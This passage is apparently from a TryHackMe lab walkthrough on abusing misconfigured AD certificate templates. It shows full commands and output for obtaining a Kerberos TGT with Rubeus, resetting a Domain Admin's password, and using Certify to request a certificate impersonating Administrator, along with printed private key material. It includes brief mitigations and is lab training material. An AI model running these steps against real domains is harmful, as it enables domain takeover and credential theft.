             gdowgdcwgdSgKzApoAMCARKhIgQgQr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVWhERsPTFVO
             QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIyMDIwNjE3
             NTQ0NlqmERgPMjAyMjAyMDcwMzU0NDZapxEYDzIwMjIwMjEzMTc1NDQ2WqgRGw9MVU5BUi5FUlVDQS5D
             T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ=
       
         ServiceName              :  krbtgt/lunar.eruca.com
         ServiceRealm             :  LUNAR.ERUCA.COM
         UserName                 :  svc.gitlab
         UserRealm                :  LUNAR.ERUCA.COM
         StartTime                :  2/6/2022 5:54:46 PM
         EndTime                  :  2/7/2022 3:54:46 AM
         RenewTill                :  2/13/2022 5:54:46 PM
         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
         KeyType                  :  aes256_cts_hmac_sha1
         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED
```

We now need to use this TGT to gain access. This can be done using your favorite hacking framework like metasploit, cobaltstrike, or covenant. However, for the purpose of this walkthrough, we will be using Rubeus again. We will use the ticket to alter the password of one of the domain administrators. This will allow us to use the DA's credentials to log into the Domain Controller as administrator to recover the final flag. Open the **Active Directory Users and Computers** application and explore the domain structure, looking for the DAs:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8db71b1509a16803e8d0b589db82f7af.png)

Select one of the DAs to target and use the following command to alter their password:

`Rubeus.exe changepw /ticket:<path to ticket file> /new:<new password for user> /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\<username of targeted DA>`  

Once the command executes, it should alter the password for the associated DA account:

Resetting a user's password

```shell-session
C:\THMTools> .\Rubeus.exe changepw /ticket:svc.gitlab.kirbi /new:Tryhackme! /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\da-nread
           ______        _
          (_____ \      | |
           _____) )_   _| |__  _____ _   _  ___
          |  __  /| | | |  _ \| ___ | | | |/___)
          | |  \ \| |_| | |_) ) ____| |_| |___ |
          |_|   |_|____/|____/|_____)____/(___/
        
          v2.0.0
        
        [*] Action: Reset User Password (AoratoPw)
        
        [*] Using domain controller: LUNDC.lunar.eruca.com (10.10.69.219)
        [*] Resetting password for target user: lunar.eruca.com\da-nread
        [*] New password value: Tryhackme!
        [*] Building AP-REQ for the MS Kpassword request
        [*] Building Authenticator with encryption key type: aes256_cts_hmac_sha1
        [*] base64(session subkey): UP+L2OgmJ281TkkXYNKR0ahLJni1fIk/XMBFwwNTP7Q=
        [*] Building the KRV-PRIV structure
        [+] Password change success!
```

You can now authenticate as this user to the Domain Controller and recover the final flag. Well done! You have now compromised DA! As an added bonus, let's look at the `runas` command, which we can use to authenticate as another user in the command prompt. We can use the following command in cmd to authenticate as the now compromised DA user:

`runas /user:lunar.eruca.com\<username of DA> cmd.exe   `

You will be prompted to provide the password for the associated account. If correct, `runas` will spawn a command prompt window for you as the specified user, which you can now use for administrative duties.  

Answer the questions below

```
C:\Users\thm>cd C:\THMTools\

C:\THMTools>dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\THMTools

01/20/2022  03:35 PM    <DIR>          .
01/20/2022  03:35 PM    <DIR>          ..
10/22/2021  11:01 AM           417,280 Rubeus.exe
               1 File(s)        417,280 bytes
               2 Dir(s)  51,866,243,072 bytes free

C:\THMTools>.\Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:C:\Users\thm\Desktop\vulncert.pfx /password:Password1@ /outfile:svc.gitlab.kirbi /domain:lunar.eruca.com /dc:10.10.221.143

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Ask TGT

[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
[*] Building AS-REQ (w/ PKINIT preauth) for: 'lunar.eruca.com\svc.gitlab'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

[*] Ticket written to svc.gitlab.kirbi


  ServiceName              :  krbtgt/lunar.eruca.com
  ServiceRealm             :  LUNAR.ERUCA.COM
  UserName                 :  svc.gitlab
  UserRealm                :  LUNAR.ERUCA.COM
  StartTime                :  2/16/2023 10:01:53 PM
  EndTime                  :  2/17/2023 8:01:53 AM
  RenewTill                :  2/23/2023 10:01:53 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  3832DqrnXYcqvcXlOqCSc/d8aLy/YveH0Q/uPyOYHKs=
  ASREP (key)              :  DF239E189CEA50C908B720FB54553EC7196637F1A2B6249529FDD2FBBE019D6D

C:\THMTools>cd C:\Users\Administrator
Access is denied.

C:\THMTools>.\Rubeus.exe changepw /ticket:svc.gitlab.kirbi /new:Tryhackme! /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\da-nread

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Reset User Password (AoratoPw)

[*] Using domain controller: LUNDC.lunar.eruca.com (10.10.221.143)
[*] Resetting password for target user: lunar.eruca.com\da-nread
[*] New password value: Tryhackme!
[*] Building AP-REQ for the MS Kpassword request
[*] Building Authenticator with encryption key type: aes256_cts_hmac_sha1
[*] base64(session subkey): 3aTfRgoViYIW1zUNrDuU7JbyysmakjG5USyhepge+hg=
[*] Building the KRV-PRIV structure
[+] Password change success!

C:\THMTools>runas /user:lunar.eruca.com\da-nread cmd.exe
Enter the password for lunar.eruca.com\da-nread:
Attempting to start cmd.exe as user "lunar.eruca.com\da-nread" ...

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
lunar\da-nread

C:\Windows\system32>net user da-nread
User name                    da-nread
Full Name                    Naomi Read
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/16/2023 10:07:00 PM
Password expires             Never
Password changeable          2/16/2023 10:07:00 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/16/2023 10:07:57 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Admins        *Domain Users
The command completed successfully.


C:\Windows\system32>cd C:\Users\Administrator

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\Users\Administrator\Desktop

01/14/2022  11:52 AM    <DIR>          .
01/14/2022  11:52 AM    <DIR>          ..
01/14/2022  11:52 AM                28 flag.txt
               1 File(s)             28 bytes
               2 Dir(s)  51,865,030,656 bytes free

C:\Users\Administrator\Desktop>type flag.txt
THM{AD.Certs.Can.Get.You.DA}

```

![[Pasted image 20230216170432.png]]

What is the value of the flag stored on the Administrator's Desktop?

*THM{AD.Certs.Can.Get.You.DA}*

### Mitigations and Fixes

So how can you actually defend against these Certificate Template attacks?

There isn't really an easy answer, but there are some good defense techniques:

-   Review all the certificate templates in your organisation for poisonous parameter combinations. You can use [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit) to assist with this.
-   In cases where poisonous parameter combinations cannot be avoided, make sure that there are stopgaps such as having to require Admin Approval before the certificate will be issued.
-   Update your playbooks. Most organisations' playbooks will include something along the lines of resetting the credentials for a compromised account. As pointed out here, that's not really going to remedy the persistent access. Therefore, reviewing certificates that were issued would be required and the malicious certificate will have to be revoked.

Answer the questions below

Read the above  

 Completed

### Conclusion

That's a wrap!

In this lab, we showed a possible method to exploit misconfigured AD certificate templates. As mentioned previously, there are several different potential toxic parameter combinations that you can look to exploit. Have a read through the SpecterOps whitepaper if you are interested in learning more. Since the lab contains a full Domain Controller and you now have DA access, you can look to configure your own certificate templates to play around with. Have fun!  

Answer the questions below

Read the above  

 Completed

```
another way

┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
└─$ ls
 Certify.exe                        README.md             SharpDPAPI.exe
'dotnet v3.5 compiled binaries'     RestrictedAdmin.exe   SharpDump.exe
'dotnet v4.5 compiled binaries'     Rubeus.exe            SharpRoast.exe
'dotnet v4.7.2 compiled binaries'   SafetyKatz.exe        SharpUp.exe
 Koh.exe                            Seatbelt.exe          SharpWMI.exe
 LockLess.exe                       SharpChrome.exe
                                                                                   
┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.221.143 - - [16/Feb/2023 17:16:23] "GET /Certify.exe HTTP/1.1" 200 -

C:\THMTools>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\THMTools> iwr http://10.8.19.103:1337/Certify.exe -outfile C:\THMTools\Certify.exe


PS C:\THMTools> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=lunar,DC=eruca,DC=com'

[*] Listing info about the Enterprise CA 'lunar-LUNDC-CA'

    Enterprise CA Name            : lunar-LUNDC-CA
    DNS Hostname                  : LUNDC.lunar.eruca.com
    FullName                      : LUNDC.lunar.eruca.com\lunar-LUNDC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=lunar-LUNDC-CA, DC=lunar, DC=eruca, DC=com
    Cert Thumbprint               : 1801B99A99D23D0CF06A8676A1891FDD0F16C512
    Cert Serial                   : 77420116D46A6586476B85BD5BF6A237
    Cert Start Date               : 1/14/2022 7:21:18 AM
    Cert End Date                 : 1/14/2027 7:31:16 AM
    Cert Chain                    : CN=lunar-LUNDC-CA,DC=lunar,DC=eruca,DC=com
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
      Allow  ManageCA, ManageCertificates               LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : LUNDC.lunar.eruca.com\lunar-LUNDC-CA
    Template Name                         : UserRequest
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
                                      LUNAR\Domain Users            S-1-5-21-3330634377-1326264276-632209373-513
                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
                                      NT AUTHORITY\Authenticated UsersS-1-5-11
      Object Control Permissions
        Owner                       : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
        WriteOwner Principals       : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
                                      LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
        WriteDacl Principals        : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
                                      LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
        WriteProperty Principals    : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
                                      LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519

    CA Name                               : LUNDC.lunar.eruca.com\lunar-LUNDC-CA
    Template Name                         : HTTPSWebServer
    Schema Version                        : 2
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication
    mspki-certificate-application-policy  : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
                                      NT AUTHORITY\Authenticated UsersS-1-5-11
      Object Control Permissions
        Owner                       : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
        WriteOwner Principals       : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
                                      LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
        WriteDacl Principals        : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
                                      LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
        WriteProperty Principals    : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
                                      LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519



Certify completed in 00:00:15.8021412

[!] Vulnerable Certificates Templates :

    CA Name                               : LUNDC.lunar.eruca.com\lunar-LUNDC-CA
    Template Name                         : UserRequest


PS C:\THMTools> .\Certify.exe request /ca:LUNDC.lunar.eruca.com\lunar-LUNDC-CA /template:UserRequest /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : LUNAR\thm
[*] No subject name specified, using current context as subject.

[*] Template                : UserRequest
[*] Subject                 : CN=Try THM. Hack Me, CN=Users, DC=lunar, DC=eruca, DC=com
[*] AltName                 : Administrator

[*] Certificate Authority   : LUNDC.lunar.eruca.com\lunar-LUNDC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 15

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4g63dRtvJxu/PI9jhQB/4kRoJJuHgAJSKpdofhsRxXbZfYNq
HkI6Kl/Xik+4W4vBypDQabmt1VoGvmko9MuaR77SCMM15MDN57vHfhaTgz9oq+GP
207HO4s9wh+9GoYUiQtg+Z/3VWMGOprDNuQU4sosKiLnNAHlA46Q4Ld99j0COHMw
G/qKk1j8h32SCjirRzREIhT3DXCxZ1gZKBcHV3OQFhExpYTk7i8GVvJdgY3wRpFu
VYHlgFjHF7ba8jOAgWMfMApzzJJx2bs2DXw1Gpp4ipMg9y+Zq3FhckYLozFTG2C1
yanXIKYEfvhi7xZfqJ6bpzTn+HucBZIUTghvXQIDAQABAoIBAQDf76g5cFXqLgiB
26HArcABy7ZHHXNbkfEHlDnFQteV/6hwN/C1zPGF7K++qj59IbN2EYMEWRYlVit8
EPyrk85f6F50o70NwRm4yEJVW9QBnpz4OFij7iRbjhI97ecNEWniYM1OO/NuOMyA
3bMo+0TdbV3W2ACleoL9xQssMVmsxOJe29fngLuG6FQaZwXLDJK13i/xn20iyrq3
BbA/UgVntpiBwaJYyVuB/unckYhnF5o/bj5GdYpnfxf+C7W2n14b+mn5Uyts+xvc
vjCEKtTxDyF67QDO5VzCqWn/3FcQf6LsbiVMFT/SpVoKXhTkRZGaWCcJdHZPSXLU
RETcrbIZAoGBAPZjDqFvv3DQasV2M2FghRLox6k8zX43X9yPjaRC/uD0Voao8wh6
67FJaDthIDujmnXhezq5NrUQ1U37x0lTRoPPPNZ2v9KVVTG3fkxQhZqATohi7GY+
ny4/+WBx7IkAwct3oMzcRe6L8HlVrGSANNvb7YCFw9UqOUKGXXOgdeXDAoGBAOrg
mz0PI7CVBkG4Gyms3tRNu6y6PN6mCcZpbVpSWe1switD7Tmx0dEjKX/YLaRgWDap
mgocDcxUYOSuzh+lOwcj2njxM5UwPe7tnqjrJAJlWN6hkKYHCHOnMRI2WrKOiRmL
oP0JZIYmvJtqkGlExAs9oDc9QEX/SjAuZbdI2GRfAoGARwg72ZLr8ExF2/O90F8R
PmhZ15Kt86tnOaExRqAB9zy6DUx79H/rn0r4f9X6gvchusZszntDKGRX+omR5LPb
ani+o13M45sl2pV6FepI+kfvXCaY3MlE/wJ2lLWDaeQL+urcMvN2PdWeWHy4nKjR
lGkNSbZGxRfNNj6iholGNB0CgYAcYX2AmEa4vJkf8c4ecAwQ3T+zNGHMiYWe2vhi
tJa3MLAZqECO+ySeP8Bw+T8yoI2oNUAuvosQSJXYrCKuAjoqt7Nbb9HK0iR5rW7B
fIBCZdqiNCWVWj40M1yjlbvJ3Z1FX/DZAnyKFT4vDWZbwfpqXUzxv833Z0ygm8qg
pgW3wwKBgQC3AdjTmd4Hy9/89bOZ/T+AVpSZ1rbPJl/a1MgE/pTTokbuKKASvYwY
v3eLIkVxwNkVl1WSccugKwv06txUHUr0t+42qhEemwZSv7hvA7HePVqCSdU40Okw
FOroN2LvavgtlXgn5JtBnJ6MBrGiSlr2dk99X+G4b7V0eEW5prPaCg==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGXTCCBUWgAwIBAgITGwAAAA8SWC5lmBQSNAAAAAAADzANBgkqhkiG9w0BAQsF
ADBcMRMwEQYKCZImiZPyLGQBGRYDY29tMRUwEwYKCZImiZPyLGQBGRYFZXJ1Y2Ex
FTATBgoJkiaJk/IsZAEZFgVsdW5hcjEXMBUGA1UEAxMObHVuYXItTFVOREMtQ0Ew
HhcNMjMwMjE2MjIxMDE3WhcNMjQwMjE2MjIxMDE3WjBuMRMwEQYKCZImiZPyLGQB
GRYDY29tMRUwEwYKCZImiZPyLGQBGRYFZXJ1Y2ExFTATBgoJkiaJk/IsZAEZFgVs
dW5hcjEOMAwGA1UEAxMFVXNlcnMxGTAXBgNVBAMTEFRyeSBUSE0uIEhhY2sgTWUw
ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDiDrd1G28nG788j2OFAH/i
RGgkm4eAAlIql2h+GxHFdtl9g2oeQjoqX9eKT7hbi8HKkNBpua3VWga+aSj0y5pH
vtIIwzXkwM3nu8d+FpODP2ir4Y/bTsc7iz3CH70ahhSJC2D5n/dVYwY6msM25BTi
yiwqIuc0AeUDjpDgt332PQI4czAb+oqTWPyHfZIKOKtHNEQiFPcNcLFnWBkoFwdX
c5AWETGlhOTuLwZW8l2BjfBGkW5VgeWAWMcXttryM4CBYx8wCnPMknHZuzYNfDUa
mniKkyD3L5mrcWFyRgujMVMbYLXJqdcgpgR++GLvFl+onpunNOf4e5wFkhROCG9d
AgMBAAGjggMEMIIDADA+BgkrBgEEAYI3FQcEMTAvBicrBgEEAYI3FQiGqOlnh6jG
PIaBlwSB4/0rhaHxS4FKhtO7NoHe8WACAWQCAQowKQYDVR0lBCIwIAYIKwYBBQUH
AwIGCCsGAQUFBwMEBgorBgEEAYI3CgMEMA4GA1UdDwEB/wQEAwIFoDA1BgkrBgEE
AYI3FQoEKDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQw
RAYJKoZIhvcNAQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
MAcGBSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBSOGWCpLOT1xOobBw7j3RPf
e2SPeDAoBgNVHREEITAfoB0GCisGAQQBgjcUAgOgDwwNQWRtaW5pc3RyYXRvcjAf
BgNVHSMEGDAWgBSwVuQVDTCXfO6YFdLBHVWyW4dytTCB0QYDVR0fBIHJMIHGMIHD
oIHAoIG9hoG6bGRhcDovLy9DTj1sdW5hci1MVU5EQy1DQSxDTj1MVU5EQyxDTj1D
RFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29u
ZmlndXJhdGlvbixEQz1sdW5hcixEQz1lcnVjYSxEQz1jb20/Y2VydGlmaWNhdGVS
ZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBv
aW50MIHHBggrBgEFBQcBAQSBujCBtzCBtAYIKwYBBQUHMAKGgadsZGFwOi8vL0NO
PWx1bmFyLUxVTkRDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWx1bmFyLERDPWVydWNh
LERDPWNvbT9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
dGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAHuDtHb95nYsXd+W0SwWO
fQSEYPoYAWDiIW431UooP7NDkhJ4gumgNFOTGHRZJDGAH8Afm5OOScHoLrCkS1lH
ZCUn8Rq88vRf+ZmfCO8E3Vd9BzzfWJSvzGu3NSNoHn9eKYFbT7zoegOpdlyWoyUT
n1muTs9y17m6d7BjBEwR5k/TKtKJYkGMrwzETmozPTJyDpGuXcA+yTXLo+Mcwr7r
UbYNA0LowCkE/U//2kFX4PtY/hGgCjD1gLC3NohW6NVjqGzWtrXfUm1kxQeqia9w
2d39Cix0DgnetDCK7fw1p7ZYSd2qK30SxlK1C+5C1/CkI7X+W9fNNa1FrqQu2SaD
zA==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:18.8281522

┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
└─$ nano cert.pem        
                                                                                   
┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
└─$ cat cert.pem 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4g63dRtvJxu/PI9jhQB/4kRoJJuHgAJSKpdofhsRxXbZfYNq
HkI6Kl/Xik+4W4vBypDQabmt1VoGvmko9MuaR77SCMM15MDN57vHfhaTgz9oq+GP
207HO4s9wh+9GoYUiQtg+Z/3VWMGOprDNuQU4sosKiLnNAHlA46Q4Ld99j0COHMw
G/qKk1j8h32SCjirRzREIhT3DXCxZ1gZKBcHV3OQFhExpYTk7i8GVvJdgY3wRpFu
VYHlgFjHF7ba8jOAgWMfMApzzJJx2bs2DXw1Gpp4ipMg9y+Zq3FhckYLozFTG2C1
yanXIKYEfvhi7xZfqJ6bpzTn+HucBZIUTghvXQIDAQABAoIBAQDf76g5cFXqLgiB
26HArcABy7ZHHXNbkfEHlDnFQteV/6hwN/C1zPGF7K++qj59IbN2EYMEWRYlVit8
EPyrk85f6F50o70NwRm4yEJVW9QBnpz4OFij7iRbjhI97ecNEWniYM1OO/NuOMyA
3bMo+0TdbV3W2ACleoL9xQssMVmsxOJe29fngLuG6FQaZwXLDJK13i/xn20iyrq3
BbA/UgVntpiBwaJYyVuB/unckYhnF5o/bj5GdYpnfxf+C7W2n14b+mn5Uyts+xvc
vjCEKtTxDyF67QDO5VzCqWn/3FcQf6LsbiVMFT/SpVoKXhTkRZGaWCcJdHZPSXLU
RETcrbIZAoGBAPZjDqFvv3DQasV2M2FghRLox6k8zX43X9yPjaRC/uD0Voao8wh6
67FJaDthIDujmnXhezq5NrUQ1U37x0lTRoPPPNZ2v9KVVTG3fkxQhZqATohi7GY+
ny4/+WBx7IkAwct3oMzcRe6L8HlVrGSANNvb7YCFw9UqOUKGXXOgdeXDAoGBAOrg
mz0PI7CVBkG4Gyms3tRNu6y6PN6mCcZpbVpSWe1switD7Tmx0dEjKX/YLaRgWDap
mgocDcxUYOSuzh+lOwcj2njxM5UwPe7tnqjrJAJlWN6hkKYHCHOnMRI2WrKOiRmL
oP0JZIYmvJtqkGlExAs9oDc9QEX/SjAuZbdI2GRfAoGARwg72ZLr8ExF2/O90F8R
PmhZ15Kt86tnOaExRqAB9zy6DUx79H/rn0r4f9X6gvchusZszntDKGRX+omR5LPb
ani+o13M45sl2pV6FepI+kfvXCaY3MlE/wJ2lLWDaeQL+urcMvN2PdWeWHy4nKjR
